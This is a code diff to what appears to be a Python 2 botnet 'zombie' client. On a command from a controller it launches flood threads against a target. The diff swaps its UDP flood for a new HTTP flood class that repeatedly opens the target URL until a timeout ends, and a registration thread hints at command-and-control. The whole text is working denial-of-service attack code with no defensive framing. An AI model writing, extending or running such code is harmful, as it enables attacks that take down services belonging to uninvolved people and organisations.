@@ -2,6 +2,7 @@ import SocketServer
 import threading
 import time
 import socket
+import urllib2
 import random
 import os
 
@@ -14,7 +15,7 @@ class zombie(SocketServer.BaseRequestHandler):
         self.request.sendall("ACK")
 
         for i in xrange(N):
-            attack = attackUDPFlood(timeout, target, port)
+            attack = attackHTTPFlood(timeout, target)
             attack.start()
 
 class attackUDPFlood(threading.Thread):
@@ -31,6 +32,20 @@ class attackUDPFlood(threading.Thread):
         start = time.time()
         while time.time() - start < self.timeout:
             victim.sendto(MESSAGE, (self.target, self.port))
+
+class attackHTTPFlood(threading.Thread):
+    def __init__(self, timeout, target):
+        threading.Thread.__init__(self)
+        self.timeoutAttack = timeout
+        self.target = "http://" + target
+
+    def run(self):
+        start = time.time()
+        while time.time() - start < self.timeoutAttack:
+            try:
+                urllib2.urlopen(self.target)
+            except IOError:
+                print "Could not open ", self.target
 
 class registerIP(threading.Thread):
     def __init__(self, HOST, PORT):
